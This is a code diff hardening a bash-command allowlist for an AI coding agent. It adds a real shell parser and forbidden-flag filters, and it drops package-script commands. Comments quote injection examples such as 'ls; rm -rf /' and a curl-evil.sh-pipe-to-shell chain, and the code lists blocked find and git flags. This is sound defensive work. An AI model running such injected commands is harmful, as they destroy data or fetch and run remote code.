@@ -1,50 +1,32 @@
 // Executor permission policy. We run with `permissionMode: 'acceptEdits'`
 // (decision §5 of the scaffold review) inside a scoped workspace, plus a
-// conservative bash allowlist. Security-review will harden this later.
+// conservative bash allowlist enforced by a real shell parser.
 
-/** Bash commands that auto-approve in `acceptEdits` mode. Anything not
- *  matched falls through to the SDK's prompt machinery (and in a voice
- *  TUI, that means we deny — there's no good UX for mid-call prompts).
+import { type ParseEntry, parse as shellParse } from 'shell-quote'
+
+/** Bash commands that auto-approve. The matcher (`isBashCommandAllowed`)
+ *  uses `shell-quote`'s real parser and rejects any candidate that yields
+ *  a non-string parse entry (operators, redirects, command substitutions,
+ *  shell globs, comments). Whatever survives gets argv-prefix matched
+ *  against the entries below.
  *
- *  MATCHING CONTRACT — read before adding entries.
+ *  Entries are argv-prefix strings: a bare entry like `ls` matches any
+ *  candidate whose argv[0] is `ls`; a two-token entry like `git diff`
+ *  requires argv[0]+argv[1] to match exactly. Beyond the prefix, the
+ *  candidate's remaining tokens are filtered by `forbiddenFlags`.
  *
- *  Entries are matched **against parsed argv tokens, NOT against the raw
- *  command string**. A naive prefix-on-string match is unsafe: `'ls '`
- *  would let `ls; rm -rf /` through, and `'git diff'` would let
- *  `git diff && curl evil.sh | sh` through. So:
+ *  Anything not on this list falls through to deny — there's no good
+ *  voice-UX for mid-call permission prompts.
  *
- *    1. Reject any candidate containing shell metacharacters before even
- *       looking at the allowlist. The blocklist below is conservative; any
- *       of these → DENY.
- *
- *           ; & | < > ` $( $\{ \\ \n  (and unbalanced quotes)
- *
- *    2. Tokenize the surviving candidate into argv (shell-quote style — a
- *       real parser, not split-on-whitespace). Compare its leading tokens
- *       against each allowlist entry's leading tokens (also tokenized).
- *
- *           candidate "git diff src/foo.ts"   argv = ["git","diff","src/foo.ts"]
- *           entry     "git diff"              argv = ["git","diff"]
- *           → match: candidate's first 2 tokens deep-equal entry's argv.
- *
- *    3. A bare entry like 'ls' matches any candidate whose argv[0] is 'ls'
- *       regardless of subsequent flags/paths. A two-token entry like
- *       'git diff' requires argv[0]+argv[1] to match exactly.
- *
- *  This makes the contract argv-prefix, not string-prefix. The candidate's
- *  remaining tokens (flags, file args) are then trusted because step 1
- *  already removed every way to escape into a second command.
- *
- *  IMPLEMENTATION lives in the executor PR — this file just declares the
- *  contract + the data the matcher consumes. The matcher itself will be a
- *  small pure function with unit tests covering: metachar injection,
- *  argv-prefix vs string-prefix divergence, quoted args, and equivalence
- *  classes (`git  diff` vs `git diff`).
+ *  Stripped (security-review): `bun run` / `bun install` / `bun test` /
+ *  `npm test` / `pnpm test` (all arbitrary-code-exec via package scripts).
+ *  The executor can still report it'd LIKE to run tests; a future "run
+ *  tests" UX needs a real confirmation surface, not a voice-blind grant.
  *
  *  TODO(security-review): broaden carefully; each addition is a new way
  *  for a hallucinated tool call to run code. */
 export const BASH_ALLOWLIST: readonly string[] = [
-  // Reading the workspace.
+  // Read-only inspection.
   'ls',
   'cat',
   'head',
@@ -55,45 +37,44 @@ export const BASH_ALLOWLIST: readonly string[] = [
   'grep',
   'rg',
   'find',
-  // Git — read-only subcommands only.
+  // Git — strictly read-only subcommands.
   'git status',
   'git diff',
   'git log',
   'git show',
-  'git branch',
-  // Builds + tests. Each requires the subcommand token to match.
-  'bun run',
-  'bun test',
-  'bun install',
-  'npm test',
-  'pnpm test',
+  // git-branch is read-only only when invoked with `--list`; the matcher
+  // requires the third token to be `--list`.
+  'git branch --list',
 ]
 
-/** Shell metacharacters whose presence in a candidate command should reject
- *  the entire command before the allowlist matcher runs. Step 1 of the
- *  contract above. */
-export const SHELL_METACHARACTERS: readonly string[] = [
-  ';',
-  '&',
-  '|',
-  '<',
-  '>',
-  '`',
-  '$(',
-  '${',
-  '\\',
-  '\n',
-]
+/** Per-allowlist-entry flag/arg filters. Applied AFTER the argv-prefix
+ *  match succeeds. The filter receives the candidate's TAIL tokens (those
+ *  past the entry's prefix); if any tail token starts with one of the
+ *  forbidden prefixes, the whole command is denied.
+ *
+ *  Why prefix-based and not exact-match: GNU CLI flags accept both `-x val`
+ *  and `-x=val`, so we block both forms by matching the leading bytes. */
+const FORBIDDEN_TAIL_FLAGS: Record<string, readonly string[]> = {
+  // -exec /-execdir / -ok / -okdir let `find` run arbitrary subprocesses;
+  // -delete writes; -fprint*/-fls write to attacker-chosen paths.
+  find: ['-exec', '-execdir', '-ok', '-okdir', '-delete', '-fprint', '-fprintf', '-fls'],
+  // `--output` / `-o` write to disk; `--ext-diff` shells out to an external
+  // diff program of the model's choice.
+  'git log': ['--output', '-o', '--ext-diff'],
+  'git diff': ['--output', '-o', '--ext-diff'],
+  'git show': ['--output', '-o', '--ext-diff'],
+}
 
 export type ExecutorPermissionPolicy = {
   /** Allow file edits without prompting. */
   permissionMode: 'acceptEdits'
-  /** Working directory the executor is scoped to. */
+  /** Working directory the executor is scoped to. Treated as the path-sandbox
+   *  root by the file-tool path-scope check in `canUseTool`. */
   cwd: string
-  /** Argv-prefix allowlist for bash (see contract above). */
+  /** Argv-prefix allowlist for bash. */
   bashAllowlist: readonly string[]
-  /** Metacharacters that reject the entire command. */
-  shellMetacharacters: readonly string[]
+  /** Per-entry forbidden tail flags. */
+  forbiddenTailFlags: Readonly<Record<string, readonly string[]>>
 }
 
 export function defaultPermissionPolicy(cwd: string): ExecutorPermissionPolicy {
@@ -101,36 +82,49 @@ export function defaultPermissionPolicy(cwd: string): ExecutorPermissionPolicy {
     permissionMode: 'acceptEdits',
     cwd,
     bashAllowlist: BASH_ALLOWLIST,
-    shellMetacharacters: SHELL_METACHARACTERS,
+    forbiddenTailFlags: FORBIDDEN_TAIL_FLAGS,
   }
 }
 
-/** Match a candidate bash command against the policy's allowlist.
+/** Match a candidate bash command against the policy.
  *
- *  MINIMAL FIRST CUT (flagged for security-review):
- *   - Step 1: metachar blocklist — any character in `shellMetacharacters`
- *     in the candidate rejects it. This is the only thing keeping us
- *     honest about argv-prefix vs string-prefix; without it, an allowed
- *     `ls` would let `ls; rm -rf /` through.
- *   - Step 2: tokenize on whitespace. This is NOT a real shell tokenizer
- *     — it doesn't understand quoting. Acceptable because step 1 already
- *     rejected commands carrying the metachars that would matter. A
- *     quoted-arg-with-spaces (`cat "file with space"`) still type-checks
- *     against `cat` (argv[0] is `cat`); the extra split tokens are
- *     ignored by the prefix match.
- *   - Step 3: every entry's tokens must equal the candidate's leading
- *     tokens. `ls` matches `ls -la /tmp`; `git diff` matches `git diff x`
- *     but not `git push`. */
+ *  CONTRACT:
+ *   1. Parse with `shell-quote`. REJECT if the result contains ANY non-string
+ *      entry — operators (`;`, `&&`, `||`, `|`, `<`, `>`, `>>`, …),
+ *      command substitutions (`$(…)`, backticks → shell-quote represents
+ *      them as ops), variable expansions, redirects, globs that didn't
+ *      match (returned as `{op:'glob', pattern}`), or comments.
+ *      Anything that isn't a literal argv token disqualifies the command.
+ *   2. Argv-prefix match the resulting tokens against each entry in
+ *      `bashAllowlist`. A 2-token entry needs both tokens to match.
+ *   3. For matched entries with a `forbiddenTailFlags` rule, scan the
+ *      tail tokens (those past the entry's prefix length): if any starts
+ *      with a forbidden prefix (e.g. `-exec`, `-exec=...`), DENY.
+ *
+ *  Out-of-scope-by-design: arg-content checks (e.g. `cat /etc/passwd`).
+ *  That's handled by the executor's path-scope rule in `canUseTool` for
+ *  file tools, and by the prompt-side "no reading secrets" rule for bash.
+ *  The bash allowlist is the SHAPE filter; content is checked elsewhere. */
 export function isBashCommandAllowed(command: string, policy: ExecutorPermissionPolicy): boolean {
   if (!command) return false
-  for (const meta of policy.shellMetacharacters) {
-    if (command.includes(meta)) return false
+
+  let parsed: ParseEntry[]
+  try {
+    parsed = shellParse(command)
+  } catch {
+    return false
   }
-  const tokens = command
-    .trim()
-    .split(/\s+/)
-    .filter((t) => t.length > 0)
-  if (tokens.length === 0) return false
+  if (parsed.length === 0) return false
+
+  // Step 1: REJECT any non-string token. Any operator, glob, comment, or
+  // substitution disqualifies the command entirely.
+  const tokens: string[] = []
+  for (const entry of parsed) {
+    if (typeof entry !== 'string') return false
+    tokens.push(entry)
+  }
+
+  // Step 2 + 3: argv-prefix match, with tail-flag filter for matched entries.
   for (const entry of policy.bashAllowlist) {
     const entryTokens = entry
       .trim()
@@ -145,7 +139,25 @@ export function isBashCommandAllowed(command: string, policy: ExecutorPermission
         break
       }
     }
-    if (matches) return true
+    if (!matches) continue
+
+    const forbidden = policy.forbiddenTailFlags[entry]
+    if (forbidden && forbidden.length > 0) {
+      const tail = tokens.slice(entryTokens.length)
+      for (const arg of tail) {
+        for (const bad of forbidden) {
+          // `bad` is a literal forbidden prefix. `arg.startsWith(bad)`
+          // catches the exact form (`--output`), the `=value` form
+          // (`--output=foo`), and the bunched-short-flag form (`-ofoo`).
+          // Over-broad in principle (`--outputs` would also match) but for
+          // these specific flags there's no benign collision.
+          if (arg.startsWith(bad)) return false
+        }
+      }
+    }
+
+    return true
   }
+
   return false
 }
